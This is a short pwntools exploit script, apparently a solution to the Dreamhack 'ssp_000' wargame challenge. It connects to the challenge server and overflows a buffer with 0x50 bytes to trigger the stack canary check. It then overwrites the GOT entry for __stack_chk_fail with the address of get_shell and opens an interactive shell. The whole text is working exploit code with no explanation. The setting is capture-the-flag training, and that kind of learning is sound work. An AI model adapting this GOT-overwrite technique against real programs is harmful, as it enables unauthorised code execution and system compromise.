from pwn import *

exe = ELF('ssp_000', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 15638)

payload = b'a'*0x50
r.send(payload)

payload = str(exe.got['__stack_chk_fail'])
r.sendlineafter(b'Addr : ', payload)

payload = str(exe.sym['get_shell'])
r.sendlineafter(b'Value : ', payload)

r.interactive()